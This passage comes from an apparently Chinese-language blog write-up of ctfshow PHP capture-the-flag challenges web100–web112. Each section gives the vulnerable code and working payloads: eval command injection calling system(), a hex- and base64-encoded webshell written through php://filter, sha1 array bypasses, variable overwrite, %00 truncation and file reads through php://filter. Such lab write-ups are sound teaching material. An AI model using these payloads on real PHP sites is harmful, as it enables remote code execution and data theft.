<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>按照运算优先级，先执行<code>=</code>也就是赋值给$a为true，false就被忽略了，思路也就有了，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;system(&quot;tac ctfshow.php&quot;)&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web100/OU85D5HVD%25ONT_%25R1M9IS_F.png" alt=""><br>
得到<code>$flag_is_1ce376300x2d8dc70x2d4b870x2d9f0e0x2d1eea5dada15;</code>，其中0x2d需要替换成<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1ce37630-8dc7-4b87-9f0e-1eea5dada15</span><br></pre></td></tr></table></figure>
<p>然而一共35位还少了一位，最后一位需要不断提交flag爆破，0-9a-f一共试最多16次即可得到flag，我试到第六次提交成功😭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1ce37630-8dc7-4b87-9f0e-1eea5dada156&#125;</span><br></pre></td></tr></table></figure>
<h3 id="web101"><a class="header-anchor" href="#web101">¶</a>web101</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在上一题基础上多进行了过滤，所以上题payload无法使用，查了一下资料，发现还有类反射的知识点</p>
<blockquote>
<p>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。<br>
$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类<br>
$instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化ctfshow类</p>
</blockquote>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p>也要像上题一样改掉0x2d和最后一位进行爆破</p>
<h3 id="web102"><a class="header-anchor" href="#web102">¶</a>web102</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先继续了解几个函数</p>
<blockquote>
<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true</p>
<p><strong>call_user_func()</strong> 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数</p>
<p><strong>file_put_contents()</strong> 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容</p>
</blockquote>
<p>首先，get传参v2和v3，post传参v1；if中需要v4为真才能往下执行，而v4要为真就是v2传的参数要为数字或者数字字符串，同时v2也是我们要写入的webshell<br>
为了让v2为数字或者数字字符串，我们可以先把我们的webshell转换为base64编码，再把base64编码转换为16进制，这是一种办法去转换成数字</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = base64_encode(<span class="string">&#x27;&lt;?=`tac *`;&#x27;</span>);</span><br><span class="line">$b = str_replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64加密后:&quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = call_user_func(<span class="string">&#x27;bin2hex&#x27;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;16进制形式:&quot;</span>.$a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">base64加密后:PD89YHRhYyAqYDs</span></span><br><span class="line"><span class="comment">16进制形式:504438395948526859794171594473</span></span><br><span class="line"><span class="comment">bool(true)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>说明：&lt;?=是php的短标签，是echo()的快捷用法<br>
还有一点，就是substr()取得是从下标为2开始的字符串，我们在前面加00两位数<br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure>
<p>解着再访问dotast.php即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web102/%40%5DWGZPG6ZM95T567AW%40W0I5.png" alt=""></p>
<h3 id="web103"><a class="header-anchor" href="#web103">¶</a>web103</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>和上题一样的思路，payload继续用上题的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure>
<h3 id="web104"><a class="header-anchor" href="#web104">¶</a>web104</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>倒是变得简单了，考的sha1函数特性，sha1()函数无法处理数组类型，会返回NULL，if条件就成立了，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2[]&#x3D;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web104/701D5594A%60SX_%60RC_PP3W_V.png" alt=""></p>
<h3 id="web105"><a class="header-anchor" href="#web105">¶</a>web105</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line">$suces=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">&#x27;flag&#x27;</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.$flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里利用的是变量覆盖，关键点在$$key=$$value，这里把$key的值当作了变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如 $key&#x3D;flag  则$$key&#x3D;$flag</span><br></pre></td></tr></table></figure>
<p>这里一共有三个变量，$error、$suces和$flag；这里通过die($error)或者die($suces)都可以输出flag，所以有两个payload<br>
<strong>第一种：</strong><br>
通过die($error)输出flag，首先我们把$flag的值传给$dotast，接着再把$dotast的值传给$error，于是$error的值就是flag，再通过if判断die输出就是flag<br>
例如$flag=ctfshow{xxxxx}，?dotast=flag，通过第一个for循环，也就是$dotast=$flag，$dotast=ctfshow{xxxxx}，接着再通过第二个for循环，$error=$dotast，此时$error=ctfshow{xxxxx}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?dotast&#x3D;flag</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">error&#x3D;dotast</span><br></pre></td></tr></table></figure>
<p><strong>第二种：</strong><br>
通过die($suces)输出flag，首先我们把flag的值传给suces变量，接着再把flag的值给置空，已达到下面if条件为0不执行的目的，往下执行，die($suces)即可把flag输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?suces&#x3D;flag&amp;flag&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="web106"><a class="header-anchor" href="#web106">¶</a>web106</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又回归到sha1()函数的问题，这次在前面多加了一个判断<code>$v1 != $v2</code>，我们就给他们赋值不同就好了，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2[]&#x3D;1</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;2</span><br></pre></td></tr></table></figure>
<h3 id="web107"><a class="header-anchor" href="#web107">¶</a>web107</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    parse_str($v1,$v2);</span><br><span class="line">    <span class="keyword">if</span>($v2[<span class="string">&#x27;flag&#x27;</span>]==md5($v3))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>首先需要传一个get参数<code>v3</code>和一个post参数<code>v1</code>，注意到一个函数parse_str()</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parse_str(string,array)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>string</em></td>
<td style="text-align:left">必需。规定要解析的字符串。</td>
</tr>
<tr>
<td style="text-align:left"><em>array</em></td>
<td style="text-align:left">可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</td>
</tr>
</tbody>
</table>
</blockquote>
<p>举例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;name=dotast&amp;age=666&quot;</span>;</span><br><span class="line">parse_str($a,$b);</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">//dotast</span></span><br><span class="line"><span class="comment">//666</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v3&#x3D;dotast</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;flag&#x3D;208f1b1289da972682cbc81c8684fcc8</span><br></pre></td></tr></table></figure>
<h3 id="web108"><a class="header-anchor" href="#web108">¶</a>web108</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>首先了解一下几个函数</p>
<blockquote>
<p><strong>ereg()</strong>  函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的</p>
<p><strong>strrev()</strong> 函数反转字符串。</p>
<p><strong>intval()</strong> 函数用于获取变量的整数值</p>
</blockquote>
<p>首先需要知道%00可以截断ereg()函数的搜索，正则表达式只会匹配%00之前的内容；0x36d的十进制内容为877，我们需要字母在前来满足if条件的正则匹配来跳过if语句，接着再进行字符串的反转得到877a，接着intval()函数取整数部分得到877<br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;a%00778</span><br></pre></td></tr></table></figure>
<h3 id="web109"><a class="header-anchor" href="#web109">¶</a>web109</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v1) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里传入两个参数，并且都需要有字母，我们用php内置类让v1不进行报错，v2执行我们的命令就好了</p>
<blockquote>
<p><strong>Exception</strong> 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类</p>
<p><strong>ReflectionClass</strong> 或者 <strong>ReflectionMethod</strong> 都为常用的反射类，可以理解为一个类的映射</p>
</blockquote>
<p>所以payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">或者</span><br><span class="line">?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">或者</span><br><span class="line">?v1&#x3D;ReflectionMethod&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br></pre></td></tr></table></figure>
<h3 id="web110"><a class="header-anchor" href="#web110">¶</a>web110</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里正则进行了匹配，我们可以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/DWS8H%40%7BSFV080HL%7D%7BXVH%7B%40X.png" alt=""><br>
发现有fl36dga.txt，接着再访问即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/JFTZOQUY53BT7M9VEUP%5B%403O.png" alt=""></p>
<h3 id="web111"><a class="header-anchor" href="#web111">¶</a>web111</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;$v1,&amp;$v2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次依然考点在于变量覆盖(知识点忘记的话去温习一下web105)，首选需要<code>v1</code>含有ctfshow才能过正则，执行getflag函数，所以<code>v1=ctfshow</code>，接着再getflag函数里，会把v2的地址传给v1，接着再输出v1，这里我们可以使用php里的全局变量GLOBALS</p>
<blockquote>
<p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
</blockquote>
<p>所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
<p>过程就是<code>$ctfshow=&amp;$GLOBALS</code>(全局变量中会含有flag的变量)，接着再通过var_dump输出$ctfshow</p>
<h3 id="web112"><a class="header-anchor" href="#web112">¶</a>web112</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>首先了解几个函数</p>
<blockquote>
<p><strong>is_file()</strong> 函数检查指定的文件名是否是正常的文件</p>
<p><strong>filter()</strong> 函数用于对来自非安全来源的数据（比如用户输入）进行验证和过滤</p>
</blockquote>
<p>这里首先if语句里需要我们传入的不是文件类型才能执行highlight_file语句来读取flag文件，也就是一个绕过的考点，我们使用php伪协议即可，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web113"><a class="header-anchor" href="#web113">¶</a>web113</h3>
